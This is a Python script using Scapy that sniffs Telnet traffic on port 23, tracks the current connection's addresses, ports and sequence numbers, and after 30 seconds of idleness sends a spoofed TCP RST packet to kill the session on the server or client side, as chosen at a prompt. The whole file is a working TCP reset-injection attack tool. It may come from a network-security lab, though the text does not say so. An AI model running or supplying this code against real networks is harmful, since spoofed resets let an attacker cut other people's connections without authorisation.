import time
import threading
import sys
from scapy.all import *

current_conn = {}
last_activity_time = 0
is_stabilized = False
stop_threads = False
target_option = ""  

lock = threading.Lock()

def print_headers(packet):
    if IP in packet and TCP in packet:
        if not packet.haslayer(Raw):
            print(f"\nPacket Detected ({packet[IP].src} -> {packet[IP].dst})")
            print(f"Version {packet[IP].version}, IHL {packet[IP].ihl}, TOS {packet[IP].tos}")
            print(f"Len {packet[IP].len}, ID {packet[IP].id}, Flags {packet[IP].flags}")
            print(f"TTL {packet[IP].ttl}, Proto {packet[IP].proto}, Chksum {packet[IP].chksum}")
            print(f"Sport {packet[TCP].sport}, Dport {packet[TCP].dport}")
            print(f"Seq {packet[TCP].seq}, Ack {packet[TCP].ack}")
            print(f"Data Ofs {packet[TCP].dataofs}, Flags {packet[TCP].flags}")
            print(f"Window {packet[TCP].window}, Chksum {packet[TCP].chksum}, UrgPtr {packet[TCP].urgptr}")

def packet_callback(packet):
    global last_activity_time, current_conn, is_stabilized
    
    if IP in packet and TCP in packet:
        with lock:
            last_activity_time = time.time()
            
            if is_stabilized:
                print(f"\n activity detected! Resetting timer...")
                is_stabilized = False
            if packet[TCP].dport == 23:
                current_conn = {
                    'client_ip': packet[IP].src,
                    'client_port': packet[TCP].sport,
                    'server_ip': packet[IP].dst,
                    'server_port': packet[TCP].dport,
                    'next_seq': packet[TCP].seq + len(packet[TCP].payload),
                    'next_ack': packet[TCP].ack
                }
            elif packet[TCP].sport == 23:
                current_conn = {
                    'client_ip': packet[IP].dst,
                    'client_port': packet[TCP].dport,
                    'server_ip': packet[IP].src,
                    'server_port': packet[TCP].sport,
                    'next_seq': packet[TCP].ack, 
                    'next_ack': packet[TCP].seq + len(packet[TCP].payload) 
                }
            
            print_headers(packet)

def stabilization_monitor():
    global is_stabilized, stop_threads
    
    print("Waiting for connection...")
    
    while not stop_threads:
        time.sleep(1)
        with lock:
            if last_activity_time == 0:
                continue
                
            elapsed = time.time() - last_activity_time
            
            if elapsed >= 30 and not is_stabilized:
                print(f"\nConnection Stabilized")
                is_stabilized = True
                terminate_connection()
                stop_threads = True
                sys.exit()

def terminate_connection():
    print(f"\n attacking {target_option}...")
    
    if not current_conn:
        print("No connection details available to terminate.")
        return

    src_ip = ""
    dst_ip = ""
    src_port = 0
    dst_port = 0
    seq_num = 0
    
    if target_option == 'S':
        print(f"[*] Targeting SERVER ({current_conn['server_ip']}). Spoofing Client.")
        src_ip = current_conn['client_ip']
        dst_ip = current_conn['server_ip']
        src_port = current_conn['client_port']
        dst_port = current_conn['server_port']
        seq_num = current_conn['next_seq']
        
    elif target_option == 'C': 
        print(f"CLIENT ({current_conn['client_ip']}). Attacking Server.")
        src_ip = current_conn['server_ip']
        dst_ip = current_conn['client_ip']
        src_port = current_conn['server_port']
        dst_port = current_conn['client_port']
        seq_num = current_conn['next_ack']

    ip_layer = IP(src=src_ip, dst=dst_ip)
    tcp_layer = TCP(sport=src_port, dport=dst_port, seq=seq_num, flags="R")
    pkt = ip_layer/tcp_layer
    
    print(f"[*] Sending RST Packet: {src_ip}:{src_port} -> {dst_ip}:{dst_port} | Seq: {seq_num}")
    send(pkt, verbose=0)
    print("[***] Termination Packet Sent. Connection should be closed.")

def main():
    global target_option, stop_threads
    
    target_option = input("Whom do you want to kill? Server or Client: Enter S or C").upper()
    
    if target_option not in ['S', 'C']:
        print("Enter valid option.")
        return

    monitor_thread = threading.Thread(target=stabilization_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    try:
        sniff(filter="tcp port 23", prn=packet_callback, store=0)
    except KeyboardInterrupt:
        stop_threads = True

if __name__ == "__main__":
    main()